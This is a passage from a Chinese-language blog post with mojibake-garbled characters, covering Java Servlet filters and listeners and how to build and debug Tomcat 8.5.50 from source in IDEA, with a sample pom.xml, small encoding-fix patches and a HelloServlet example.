è¿‡æ»¤å™¨å®ƒçš„ä½œç”¨æ˜¯ï¼šæ‹¦æˆªè¯·æ±‚ï¼Œè¿‡æ»¤å“åº”ã€‚</p><p><strong>å¸¸è§åº”ç”¨åœºæ™¯ï¼š</strong><br>1ã€æƒé™æ£€æŸ¥<br>2ã€æ—¥è®°æ“ä½œ<br>3ã€äº‹åŠ¡ç®¡ç†<br>â€¦â€¦ç­‰ç­‰</p><p>æ‰€ä»¥Filterçš„é¡ºåºæ˜¯åœ¨å¤„ç†è¯·æ±‚ä¹‹å‰è¿›è¡Œ</p><p><strong>Filterä½¿ç”¨</strong></p><p>1ã€å®ç° Filter æ¥å£ï¼Œå®ç°è¿‡æ»¤æ–¹æ³• doFilter()<br>2ã€åˆ° web.xmlæˆ–è€…æ³¨è§£ä¸­å»é…ç½® Filter çš„æ‹¦æˆªè·¯å¾„</p><h2 id="filterç”Ÿå‘½å‘¨æœŸ"><a href="#Filterç”Ÿå‘½å‘¨æœŸ" class="headerlink" title="Filterç”Ÿå‘½å‘¨æœŸ"></a>Filterç”Ÿå‘½å‘¨æœŸ</h2><ol><li>æ„é€ å™¨æ–¹æ³•</li><li>init åˆå§‹åŒ–æ–¹æ³•<br>ç¬¬ 1ï¼Œ2 æ­¥ï¼Œåœ¨ web å·¥ç¨‹å¯åŠ¨çš„æ—¶å€™æ‰§è¡Œï¼ˆFilter å·²ç»åˆ›å»ºï¼‰</li><li>doFilter è¿‡æ»¤æ–¹æ³•<br>ç¬¬ 3 æ­¥ï¼Œæ¯æ¬¡æ‹¦æˆªåˆ°è¯·æ±‚ï¼Œå°±ä¼šæ‰§è¡Œ</li><li>destroy é”€æ¯<br>ç¬¬ 4 æ­¥ï¼Œåœæ­¢ web å·¥ç¨‹çš„æ—¶å€™ï¼Œå°±ä¼šæ‰§è¡Œï¼ˆåœæ­¢ web å·¥ç¨‹ï¼Œä¹Ÿä¼šé”€æ¯ Filter è¿‡æ»¤å™¨ï¼‰</li></ol><h2 id="filterconfig"><a href="#FilterConfig" class="headerlink" title="FilterConfig"></a>FilterConfig</h2><p>Tomcat æ¯æ¬¡åˆ›å»º Filter çš„æ—¶å€™ï¼Œä¹Ÿä¼šåŒæ—¶åˆ›å»ºä¸€ä¸ª FilterConfig ç±»ï¼Œè¿™é‡ŒåŒ…å«äº† Filter é…ç½®æ–‡ä»¶çš„é…ç½®ä¿¡æ¯ã€‚</p><p><strong>FilterConfig ç±»çš„ä½œç”¨æ˜¯è·å– filter è¿‡æ»¤å™¨çš„é…ç½®å†…å®¹ï¼š</strong></p><ol><li>è·å– Filter çš„åç§° filter-name çš„å†…å®¹</li><li>è·å–åœ¨ Filter ä¸­é…ç½®çš„ init-param åˆå§‹åŒ–å‚æ•°</li><li>è·å– ServletContext å¯¹è±¡</li></ol><h2 id="filterchain"><a href="#FilterChain" class="headerlink" title="FilterChain"></a>FilterChain</h2><p>å°±æ˜¯è¿‡æ»¤å™¨é“¾ï¼Œè¿‡æ»¤å™¨å¯èƒ½å­˜åœ¨ä¸æ­¢ä¸€ä¸ªï¼Œå®ƒä»¬æ‰§è¡Œçš„ä¼˜å…ˆé¡ºåºç”±å®ƒä»¬åœ¨web.xmlä¸­ä»ä¸Šåˆ°ä¸‹é…ç½®çš„<strong>filter-mapping</strong>é¡ºåºå†³å®šï¼Œä¸filterçš„é…ç½®é¡ºåºæ— å…³</p><p><strong>ç‰¹ç‚¹</strong></p><ol><li>æ‰€æœ‰filterå’Œç›®æ ‡èµ„æºé»˜è®¤éƒ½æ‰§è¡Œåœ¨ä¸€ä¸ªçº¿ç¨‹ä¸­ã€‚</li><li>å¤šä¸ªfilterå…±åŒæ‰§è¡Œçš„æ—¶å€™ï¼Œå®ƒä»¬ä½¿ç”¨çš„æ˜¯åŒä¸€ä¸ªRequestå¯¹è±¡ã€‚</li></ol><p><strong>æ‹¦æˆªè·¯å¾„åŒ¹é…è§„åˆ™</strong></p><ul><li>ç²¾ç¡®åŒ¹é… &#x2F;target.jsp</li><li>ç›®å½•åŒ¹é… &#x2F;admin&#x2F;*</li><li>åç¼€ååŒ¹é… *.html</li></ul><blockquote><p>Filteråªå…³å¿ƒè·¯å¾„æ˜¯å¦åŒ¹é…ï¼Œä¸å…³å¿ƒèµ„æºæ˜¯å¦å­˜åœ¨ï¼Œæ¯•ç«Ÿæœ€ç»ˆä¸æ˜¯ç”±å®ƒæ¥å¤„ç†</p></blockquote><h1 id="listener"><a href="#Listener" class="headerlink" title="Listener"></a>Listener</h1><p>ç”¨äºå¯¹å…¶ä»–å¯¹è±¡èº«ä¸Šå‘ç”Ÿçš„äº‹ä»¶æˆ–çŠ¶æ€æ”¹å˜è¿›è¡Œç›‘å¬å’Œç›¸åº”å¤„ç†çš„å¯¹è±¡ï¼Œå½“è¢«ç›‘è§†çš„å¯¹è±¡å‘ç”Ÿæƒ…å†µæ—¶ï¼Œç«‹å³é‡‡å–ç›¸åº”çš„è¡ŒåŠ¨ã€‚æœ¬è´¨æ˜¯<strong>è§‚å¯Ÿè€…æ¨¡å¼</strong>ã€‚</p><p><strong>Servletç›‘å¬å™¨</strong>ï¼šServletè§„èŒƒä¸­å®šä¹‰çš„ä¸€ç§ç‰¹æ®Šç±»ï¼Œå®ƒç”¨äºç›‘å¬Webåº”ç”¨ç¨‹åºä¸­çš„ServletContextï¼ŒHttpSession å’ŒHttpServletRequestç­‰åŸŸå¯¹è±¡çš„åˆ›å»ºä¸é”€æ¯äº‹ä»¶ï¼Œä»¥åŠç›‘å¬è¿™äº›åŸŸå¯¹è±¡ä¸­çš„å±æ€§å‘ç”Ÿä¿®æ”¹çš„äº‹ä»¶ã€‚</p><h2 id="ä¸‰ç±»ç›‘å¬å™¨"><a href="#ä¸‰ç±»ç›‘å¬å™¨" class="headerlink" title="ä¸‰ç±»ç›‘å¬å™¨"></a>ä¸‰ç±»ç›‘å¬å™¨</h2><p><img src="https://cdn.clown2024.cn/202409080210968.png" alt="image-20240908021003987"></p><ul><li>åŸŸå¯¹è±¡ç›‘å¬å™¨</li><li>åŸŸå¯¹è±¡çš„å±æ€§åŸŸç›‘å¬å™¨</li><li>SessionåŸŸä¸­æ•°æ®çš„ç›‘å¬å™¨</li></ul><h2 id="å…«å¤§ç›‘å¬å™¨"><a href="#å…«å¤§ç›‘å¬å™¨" class="headerlink" title="å…«å¤§ç›‘å¬å™¨"></a>å…«å¤§ç›‘å¬å™¨</h2><ol><li><p>ServletContextListener<br>ç›‘å¬ServletContextå¯¹è±¡çš„åˆ›å»ºä¸é”€æ¯</p><p>åœ¨SpringMVCä¸­ï¼Œæœ‰ä¸ª<strong>ContextLoaderListener</strong>ï¼Œè¿™ä¸ªç›‘å¬å™¨å°±å®ç°äº†ServletContextListeneræ¥å£ï¼Œè¡¨ç¤ºå¯¹ServletContextå¯¹è±¡æœ¬èº«çš„ç”Ÿå‘½å‘¨æœŸè¿›è¡Œç›‘æ§</p></li><li><p>HttpSessionListener</p><p>ç›‘å¬HttpSessionå¯¹è±¡çš„åˆ›å»ºä¸é”€æ¯</p></li><li><p>ServletRequestListener</p><p>ç›‘å¬ServletRequestå¯¹è±¡çš„åˆ›å»ºä¸é”€æ¯</p></li><li><p>ServletContextAttributeListener</p><p>ç›‘å¬ServletContextä¸­å±æ€§çš„åˆ›å»ºã€ä¿®æ”¹å’Œé”€æ¯</p></li><li><p>HttpSessionAttributeListener</p><p>ç›‘å¬HttpSessionä¸­å±æ€§çš„åˆ›å»ºã€ä¿®æ”¹å’Œé”€æ¯</p></li><li><p>ServletRequestAttributeListener</p><p>ç›‘å¬ServletRequestä¸­å±æ€§çš„åˆ›å»ºã€ä¿®æ”¹å’Œé”€æ¯</p></li><li><p>HttpSessionBindingListener</p><p>ç›‘å¬æŸä¸ªå¯¹è±¡åœ¨SessionåŸŸä¸­çš„åˆ›å»ºä¸ç§»é™¤</p></li><li><p>HttpSessionActivationListener</p><p>ç›‘å¬æŸä¸ªå¯¹è±¡åœ¨Sessionä¸­çš„åºåˆ—åŒ–ä¸ååºåˆ—åŒ–ã€‚</p></li></ol><h2 id="ç›‘å¬å™¨ä½¿ç”¨"><a href="#ç›‘å¬å™¨ä½¿ç”¨" class="headerlink" title="ç›‘å¬å™¨ä½¿ç”¨"></a>ç›‘å¬å™¨ä½¿ç”¨</h2><ol><li><p>å®ç°å…«å¤§ç›‘å¬å™¨ä¸­çš„ä¸€ç§ï¼Œé‡å†™å¯¹åº”æ–¹æ³•</p></li><li><p>åŒæ ·å»web.xmlæˆ–è€…ç”¨æ³¨è§£é…ç½®</p><p>web.xmlé…ç½®</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">listener</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">listener-class</span>&gt;</span>com.demo.listener.HelloListener<span class="hljs-tag">&lt;/<span class="hljs-name">listener-class</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">listener</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ol><h1 id="tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h1><p>æ¨èä¸€ä¸ªè§†é¢‘è®²å¾—éå¸¸å¥½(æˆ‘ä¸ªäººè§‰å¾—)ï¼ŒæŠŠå¾ˆå¤šä¸œè¥¿ä¸²èµ·æ¥äº†è€Œä¸”æ·±å…¥åˆ°æºç å±‚é¢ï¼Œç†è§£å¾—æ›´åŠ æ¸…æ™°</p><p>è§†é¢‘é“¾æ¥ï¼š<a href="https://www.bilibili.com/video/BV19E411j7cD/?spm_id_from=333.999.0.0&vd_source=f056182291458f597ae69cee19ecf116">ã€å›¾çµå­¦é™¢ã€‘ç»ˆäºæœ‰äººæŠŠtomcatè®²æ¸…æ¥šäº†ï¼Tomcatåº•å±‚åŸç†æ·±åº¦è§£æ_å“”å“©å“”å“©_bilibili</a></p><p><strong>Tomcatç®€å•æ¶æ„å›¾</strong></p><p><img src="https://cdn.clown2024.cn/202409122011964.png" alt="image-20240912201120883"></p><p>æ‰¾åˆ°çš„å¦ä¸€å¼ æ¶æ„å›¾</p><p><img src="https://cdn.clown2024.cn/202409142315429.png" alt="image-20240914231538327"></p><h2 id="tomcatæºç å¯åŠ¨"><a href="#Tomcatæºç å¯åŠ¨" class="headerlink" title="Tomcatæºç å¯åŠ¨"></a>Tomcatæºç å¯åŠ¨</h2><p>è¿™é‡Œå°±æäº†æˆ‘å¥½ä¹…äº†ï¼Œçœ‹äº†å¾ˆå¤šæ–‡ç« æ‰æå®šï¼Œæœ€åå‚è€ƒçš„æ˜¯ä¸‹é¢ä¸¤ç¯‡æ–‡ç« </p><p><a href="https://blog.csdn.net/zhoutaoping1992/article/details/104751705">è®°ä¸€æ¬¡tomcatæºç å¯åŠ¨æ§åˆ¶å°ä¸­æ–‡ä¹±ç é—®é¢˜è°ƒè¯•è¿‡ç¨‹_org.apache.catalina.startup.versionloggerlistener.-CSDNåšå®¢</a></p><p><a href="https://www.cnblogs.com/huim/p/16614196.html">ideaè°ƒè¯•tomcatæºç  - huim - åšå®¢å›­ (cnblogs.com)</a></p><p><strong>æºç ä¸‹è½½</strong></p><p>é¦–å…ˆæ‰¾åˆ°æºç åŒ…ä¸‹è½½ï¼Œè¿™é‡Œç”¨çš„tomcat-8.5.50çš„ç‰ˆæœ¬</p><p>å†å²ç‰ˆæœ¬åˆ—è¡¨ï¼š<a href="https://archive.apache.org/dist/tomcat/tomcat-8/">https://archive.apache.org/dist/tomcat/tomcat-8/</a><br>æºç æ–‡ä»¶å¤¹ï¼š<a href="https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.50/src/">https://archive.apache.org/dist/tomcat/tomcat-8/v8.5.50/src/</a></p><p>ç„¶ååœ¨æºç æ ¹ç›®å½•ä¸‹æ·»åŠ å¦‚ä¸‹pom.xmlæ–‡ä»¶</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">project</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&quot;</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">modelVersion</span>&gt;</span>4.0.0<span class="hljs-tag">&lt;/<span class="hljs-name">modelVersion</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>Tomcat8.0<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">name</span>&gt;</span>Tomcat8.0<span class="hljs-tag">&lt;/<span class="hljs-name">name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">build</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">finalName</span>&gt;</span>Tomcat8.0<span class="hljs-tag">&lt;/<span class="hljs-name">finalName</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">sourceDirectory</span>&gt;</span>java<span class="hljs-tag">&lt;/<span class="hljs-name">sourceDirectory</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">testSourceDirectory</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">testSourceDirectory</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">resources</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">resource</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">directory</span>&gt;</span>java<span class="hljs-tag">&lt;/<span class="hljs-name">directory</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">resource</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">resources</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">testResources</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">testResource</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">directory</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">directory</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">testResource</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">testResources</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">plugins</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">plugin</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.maven.plugins<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>maven-compiler-plugin<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>                <span class="hljs-tag">&lt;<span class="hljs-name">configuration</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">encoding</span>&gt;</span>UTF-8<span class="hljs-tag">&lt;/<span class="hljs-name">encoding</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">source</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">source</span>&gt;</span><br>                    <span class="hljs-tag">&lt;<span class="hljs-name">target</span>&gt;</span>1.8<span class="hljs-tag">&lt;/<span class="hljs-name">target</span>&gt;</span><br>                <span class="hljs-tag">&lt;/<span class="hljs-name">configuration</span>&gt;</span><br>            <span class="hljs-tag">&lt;/<span class="hljs-name">plugin</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">plugins</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">build</span>&gt;</span><br><br>    <span class="hljs-tag">&lt;<span class="hljs-name">dependencies</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>junit<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.12<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">scope</span>&gt;</span>test<span class="hljs-tag">&lt;/<span class="hljs-name">scope</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.easymock<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>easymock<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>3.4<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>ant<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>ant<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.7.0<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>wsdl4j<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>wsdl4j<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.6.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>javax.xml<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>jaxrpc<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>        <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.eclipse.jdt.core.compiler<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>ecj<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>            <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>4.5.1<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>        <span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;/<span class="hljs-name">dependencies</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">project</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409092054244.png" alt="image-20240909205433170"></p><p>ç„¶åé…ç½®ä¸€ä¸‹åˆé€‚çš„jdkç‰ˆæœ¬ï¼Œè¿™ä¸ªå°±ä¸å¤šè¯´äº†</p><p>ä¸‹ä¸€æ­¥é…ç½®configurationï¼Œæ·»åŠ ä¸€ä¸ªapplication</p><p><img src="https://cdn.clown2024.cn/202409092056897.png" alt="image-20240909205609843"></p><p>æ·»åŠ å…¥å£ç±»org.apache.catalina.startup.Bootstrap</p><blockquote><p>åœ¨æ­¤ä¹‹å‰éœ€è¦reloadä¸€ä¸‹mavené¡¹ç›®ï¼Œä¸ç„¶ä¼šä¸è¯†åˆ«ç›¸å…³çš„javaæºç </p></blockquote><p><img src="https://cdn.clown2024.cn/202409092057339.png" alt="image-20240909205701250"></p><p>ç„¶åæˆ‘ä»¬å°±å¯ä»¥å¯åŠ¨äº†</p><p><strong>é”™è¯¯ä¸€</strong></p><p>è¿™æ—¶å€™ä¼šé‡åˆ°ç¬¬ä¸€ä¸ªé”™è¯¯ï¼Œæ— æ³•è§£æjspï¼Œä¹Ÿå°±æ˜¯è®¿é—®localhost:8080ä¸æ˜¯tomcatçš„é¦–é¡µè€Œæ˜¯è¿”å›äº†500ï¼Œè¿™æ—¶å€™éœ€è¦å»æ·»åŠ ä¸€ä¸ªJSPè§£æå™¨ï¼Œéœ€è¦æˆ‘ä»¬å»ä¿®æ”¹æºç </p><p>æ‰¾åˆ°org.apache.catalina.startup.ContextConfigç±»ï¼Œåœ¨ConfigureStartæ–¹æ³•ä¸‹æ·»åŠ å¦‚ä¸‹ä»£ç </p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java">context.addServletContainerInitializer(<span class="hljs-keyword">new</span> <span class="hljs-title class_">JasperInitializer</span>(), <span class="hljs-literal">null</span>);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409092101636.png" alt="image-20240909210146552"></p><p><strong>é”™è¯¯äºŒ</strong></p><p>è¿™æ—¶å€™é¡µé¢è®¿é—®æ˜¯æ­£å¸¸çš„ï¼Œä½†æ˜¯æ§åˆ¶å°çš„æ—¥å¿—æ˜¯ä¹±ç çš„ï¼Œå¦‚ä¸‹</p><p><img src="https://cdn.clown2024.cn/202409092047988.png" alt="image-20240909204702883"></p><p>è¿™æ˜¯å› ä¸ºåœ¨javaä¸­, è¯»å–æ–‡ä»¶çš„é»˜è®¤æ ¼å¼æ˜¯iso8859-1, è€Œæˆ‘ä»¬ä¸­æ–‡å­˜å‚¨çš„æ—¶å€™ä¸€èˆ¬æ˜¯UTF-8. æ‰€ä»¥å¯¼è‡´è¯»å‡ºæ¥çš„æ˜¯ä¹±ç ã€‚</p><p>æ–‡ç« ä¸­æœ‰ä¸¤ç§æ–¹å¼ä¿®æ”¹ä¹±ç ï¼Œæˆ‘è¿™é‡Œé‡‡ç”¨ä¿®æ”¹æºç çš„æ–¹å¼å»ä¿®æ”¹ï¼Œå°±æ˜¯æ‰¾åˆ°è¯»å–æ–‡ä»¶çš„åœ°æ–¹ï¼Œè½¬åŒ–ä¸€ä¸‹ç¼–ç æ–¹å¼ï¼Œè¿™é‡Œç›´æ¥copyä¸€ä¸‹è§£å†³æ–¹æ¡ˆï¼Œå¯ä»¥è‡ªå·±é€šè¿‡è°ƒè¯•å»æ‰¾åˆ°å¯¹åº”ä½ç½®(æˆ‘æ¯”è¾ƒæ‡’å°±ä¸è°ƒäº†)</p><ul><li><p>org.apache.tomcat.util.res.StringManagerç±»ä¸­çš„getString(final String key, final Objectâ€¦ args)æ–¹æ³•ï¼›æ·»åŠ å¦‚ä¸‹ä»£ç </p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span>&#123;<br>        value =<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(value.getBytes(<span class="hljs-string">&quot;ISO-8859-1&quot;</span>),<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>&#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>    &#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409092105213.png" alt="image-20240909210550131"></p></li><li><p>org.apache.jasper.compiler.Localizerç±»çš„getMessage(String errCode)æ–¹æ³•ï¼›æ·»åŠ å¦‚ä¸‹ä»£ç </p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">try</span>&#123;<br>        errMsg =<span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>(errMsg.getBytes(<span class="hljs-string">&quot;ISO-8859-1&quot;</span>),<span class="hljs-string">&quot;UTF-8&quot;</span>);<br>    &#125;<span class="hljs-keyword">catch</span>(Exception e)&#123;<br>        e.printStackTrace();<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202409092107159.png" alt="image-20240909210715069"></p></li></ul><p>åˆ°è¿™é‡Œå°±è§£å†³å®Œæˆ‘é‡åˆ°çš„æ‰€æœ‰é—®é¢˜ï¼Œå¯ä»¥å¿«ä¹è°ƒè¯•äº†ğŸ«¡</p><h2 id="åŸç†åˆ†æ"><a href="#åŸç†åˆ†æ" class="headerlink" title="åŸç†åˆ†æ"></a>åŸç†åˆ†æ</h2><p>æˆ‘ä»¬é¦–å…ˆè¦çŸ¥é“Tomcatæ˜¯ä¸€ä¸ªservletå®¹å™¨ã€‚</p><h3 id="httpservletrequestå’Œhttpservletresponse"><a href="#HttpServletRequestå’ŒHttpServletResponse" class="headerlink" title="HttpServletRequestå’ŒHttpServletResponse"></a>HttpServletRequestå’ŒHttpServletResponse</h3><p><img src="https://cdn.clown2024.cn/202409112032626.png" alt="image-20240911203158516"></p><p><img src="https://cdn.clown2024.cn/202409112033582.png" alt="image-20240911203322536"></p><p>æˆ‘ä»¬çŸ¥é“HttpServletRequestå’ŒHttpServletResponseæ˜¯ä¸€ä¸ªæ¥å£ï¼Œæˆ‘ä»¬æ­£å¸¸å†™ä¸€ä¸ªservletå¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.servlettest;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><br><span class="hljs-keyword">import</span> jakarta.servlet.http.*;<br><span class="hljs-keyword">import</span> jakarta.servlet.annotation.*;<br><br><br><span class="hljs-meta">@WebServlet(name = &quot;helloServlet&quot;, value = &quot;/hello-servlet&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloServlet</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HttpServlet</span> &#123;<br>    <span class="hljs-keyword">private</span> String message;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> &#123;<br>        message = <span class="hljs-string">&quot;Hello World!&quot;</span>;<br>        System.out.println(message);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">doGet</span><span class="hljs-params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        response.setContentType(<span class="hljs-string">&quot;text/html&quot;</span>);<br><br>        <br>        <span class="hljs-comment">// Hello</span><br>        <span class="hljs-type">PrintWriter</span> <span class="hljs-variable">out</span> <span class="hljs-operator">=</span> response.getWriter();<br>        out.println(<span class="hljs-string">&quot;&lt;html&gt;&lt;body&gt;&quot;</span>);<br>        out.println(<span class="hljs-string">&quot;&lt;h1&gt;&quot;</span> + message + <span class="hljs-string">&quot;&lt;/h1&gt;&quot;</span>);<br>        out.println(<span class="hljs-string">&quot;&lt;/body&gt;&lt;/html&gt;&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">destroy</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;destory &quot;</span>+message);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>é‚£æˆ‘ä»¬è°ƒç”¨è¿™ä¸¤ä¸ªæ¥å£çš„æ–¹æ³•å°±éœ€è¦ä¸€ä¸ªå®ç°ç±»ï¼Œé‚£è¿™ä¸ªå®ç°ç±»æ˜¯è°åˆ›å»ºå‘¢ï¼Œå°±ç”±æˆ‘ä»¬çš„tomcatæ¥åˆ›å»º</p><p>å»çœ‹tomcatçš„æºç 